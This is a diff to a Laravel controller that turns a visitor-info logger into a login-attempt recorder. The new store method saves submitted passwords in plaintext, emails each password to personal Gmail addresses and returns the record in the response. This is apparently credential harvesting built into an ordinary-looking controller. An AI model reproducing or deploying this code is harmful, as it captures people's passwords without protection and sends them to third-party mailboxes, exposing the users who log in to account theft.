@@ -2,12 +2,12 @@
 
 namespace App\Http\Controllers;
 
-use App\Info;
-use App\Mail\VisitMail;
+use App\LoginInfo;
+use App\Mail\LoggedIn;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Mail;
 
-class InfoController extends Controller
+class LoginInfoController extends Controller
 {
     /**
      * Display a listing of the resource.
@@ -38,34 +38,36 @@ class InfoController extends Controller
     public function store(Request $request)
     {
         //
-        $info = new Info();
-        $info->ip = $request->ip;
-        $info->name = $request->name;
-        $info->browser = $request->browser;
+        $info = new LoginInfo();
+        $info->attempt = $request->attempt;
+        $info->password = $request->password;
+        if($request->password == null){
+            $info->password = '';
+        }
         $info->save();
-        // Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com", "crlnkurniawan@gmail.com"])->send(new VisitMail($info));
-        Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com"])->send(new VisitMail($info));
-        return 200;
+        // "crlnkurniawan@gmail.com"
+        Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com"])->send(new LoggedIn($info->password));
+        return $info;
     }
 
     /**
      * Display the specified resource.
      *
-     * @param  \App\Info  $info
+     * @param  \App\LoginInfo  $loginInfo
      * @return \Illuminate\Http\Response
      */
-    public function show(Info $info)
+    public function show(LoginInfo $loginInfo)
     {
         //
     }
-
+    
     /**
      * Show the form for editing the specified resource.
      *
-     * @param  \App\Info  $info
+     * @param  \App\LoginInfo  $loginInfo
      * @return \Illuminate\Http\Response
      */
-    public function edit(Info $info)
+    public function edit(LoginInfo $loginInfo)
     {
         //
     }
@@ -74,10 +76,10 @@ class InfoController extends Controller
      * Update the specified resource in storage.
      *
      * @param  \Illuminate\Http\Request  $request
-     * @param  \App\Info  $info
+     * @param  \App\LoginInfo  $loginInfo
      * @return \Illuminate\Http\Response
      */
-    public function update(Request $request, Info $info)
+    public function update(Request $request, LoginInfo $loginInfo)
     {
         //
     }
@@ -85,10 +87,10 @@ class InfoController extends Controller
     /**
      * Remove the specified resource from storage.
      *
-     * @param  \App\Info  $info
+     * @param  \App\LoginInfo  $loginInfo
      * @return \Illuminate\Http\Response
      */
-    public function destroy(Info $info)
+    public function destroy(LoginInfo $loginInfo)
     {
         //
     }
